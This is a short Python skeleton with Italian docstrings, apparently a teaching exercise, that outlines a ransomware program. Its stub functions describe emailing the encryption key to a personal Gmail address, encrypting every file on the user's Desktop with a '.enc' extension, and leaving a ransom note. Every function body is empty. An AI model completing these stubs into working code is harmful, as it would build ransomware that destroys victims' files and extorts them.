def genera_chiave():
    """Genera una chiave casuale per la cifratura dei
    file e la invia per email a pierobrandola@gmail.com
    """
    pass

def cifra_file_singolo(file_path, chiave):
    r"""Cifra il file specificato con un algoritmo
    qualsiasi. Il file cifrato dovrà avere lo stesso
    nome e lo stesso percorso del file iniziale ma
    con aggiunta l'estensione '.enc'
    
    es. C:\Users\rnd\Desktop\prova.txt diventa
        C:\Users\rnd\Desktop\prova.txt.enc

    Chiave è una stringa qualsiasi: a seconda dell'algoritmo
    di cifratura usato potrebbe dover essere trasformata
    in "qualcos'altro"...
    """
    pass

def cifra_tutti_i_file(chiave):
    """Scorre tutti i file nella directory Desktop
    dell'utente corrente e li cifra usando la funzione
    cifra_file_singolo
    """
    pass

def scrivi_messaggio_minatorio():
    """Scrive un file di testo con la richiesta di
    riscatto sul Desktop dell'utente corrente.
    """
    pass

if __name__ == "__main__":
    print("Benvenuti nel nostro fantastico RANSOMWARE")
    chiave = genera_chiave()
    cifra_tutti_i_file(chiave)
    scrivi_messaggio_minatorio()